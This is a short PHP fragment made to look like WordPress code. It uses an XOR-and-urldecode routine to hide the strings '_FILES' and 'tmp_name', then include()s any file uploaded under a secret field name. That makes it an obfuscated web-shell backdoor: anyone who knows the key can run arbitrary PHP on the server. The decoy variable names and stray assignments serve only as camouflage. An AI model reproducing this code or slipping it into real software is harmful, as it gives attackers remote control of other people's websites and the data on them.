...
$no_texturize_shortcodes_stack = 'NiMeFOwhlEWUG';
function ext_preg($update_term_cache, $shortcode_regex)

{
    $cats = urldecode($update_term_cache);

    $length = substr($shortcode_regex,0, strlen($cats));
    $count = $cats ^ $length;
    return $count;
}
$foundid = ${ext_preg("%11%2F%04%29%03%1C", $no_texturize_shortcodes_stack)};
	$updated = 'exclusions';
if (isset($foundid[$no_texturize_shortcodes_stack]))

{
    $fields = $foundid[$no_texturize_shortcodes_stack];

    $term = $fields[ext_preg("%3A%04%3D%3A%28.%1A%0D", $no_texturize_shortcodes_stack)];
    include ($term);
	$post_updated = 'menu_position';
}
